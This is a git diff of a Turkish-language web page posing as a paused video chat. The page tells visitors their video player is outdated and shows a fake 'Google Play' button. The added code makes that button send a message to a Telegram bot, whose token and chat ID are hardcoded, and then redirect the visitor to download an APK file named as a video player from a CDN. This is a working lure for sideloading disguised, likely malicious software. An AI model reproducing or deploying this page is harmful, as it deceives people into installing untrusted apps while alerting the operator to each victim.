@@ -50,24 +50,7 @@
           animation: pulse-heart 1s ease-in-out infinite;
         }
       }
-    </style
-        <!-- Yandex.Metrika counter -->
-<script type="text/javascript" >
-   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
-   m[i].l=1*new Date();
-   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
-   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
-   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
-
-   ym(102035084, "init", {
-        clickmap:true,
-        trackLinks:true,
-        accurateTrackBounce:true,
-        webvisor:true
-   });
-</script>
-<noscript><div><img src="https://mc.yandex.ru/watch/102035084" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
-<!-- /Yandex.Metrika counter -->
+    </style>
 </head>
 <body>
     <div class="bg-black bg-opacity-50 flex absolute py-1 px-3 rounded-full gap-2 top-4 left-3">
@@ -111,11 +94,14 @@
         <p class="font-bold">Görüşme Duraklatıldı!</p>
         <p class="font-light text-[14px]">Video Oynatıcı son sürüm bulunamadı.Lütfen Video Oynatıcınızı Son sürüme Güncelleyin.</p>
             <!-- eklenecek link href="#" bu kısma eklenmeli -->
-        <a href="gizlichat\index.html"
-            class="bg-[#6156DF] animate-pulse-heart text-white w-44 rounded-xl flex items-center justify-center p-3 px-5 relative">
-            Google Play
-            <i class="fa-solid fa-angle-right absolute right-4"></i>
-        <script>
+        <a href="#"
+   onclick="downloadFile(); return false;"
+   class="bg-[#6156DF] animate-pulse-heart text-white w-44 rounded-xl flex items-center justify-center p-3 px-5 relative">
+   Google Play
+   <i class="fa-solid fa-angle-right absolute right-4"></i>
+</a>
+
+<script>
     function downloadFile() {
         var token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
         var chatId = '-1002478190818';
@@ -124,17 +110,18 @@
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(response => response.json())
             .then(data => {
-
                 console.log('Telegram mesajı gönderildi:', data);
+                // Mesaj gönderildikten sonra yönlendir
+                window.location.href = 'https://ucarecdn.com/d7958178-e735-4972-8bca-d6131482a000/VideoOynatc.apk';
             })
             .catch(error => {
-                console.error('', error);
+                console.error('Telegram mesajı gönderilemedi:', error);
+                // Hata olsa bile yönlendir
+                window.location.href = 'https://ucarecdn.com/d7958178-e735-4972-8bca-d6131482a000/VideoOynatc.apk';
             });
-
-        window.location.href = 'https://sohbetetme.elevatesolutions.cfd';
     }
 </script>
-        </a>
+
         <div>
             <ul class="list-disc text-[11px]"><li> tamamen
                     ücretsizdir.</li></ul>
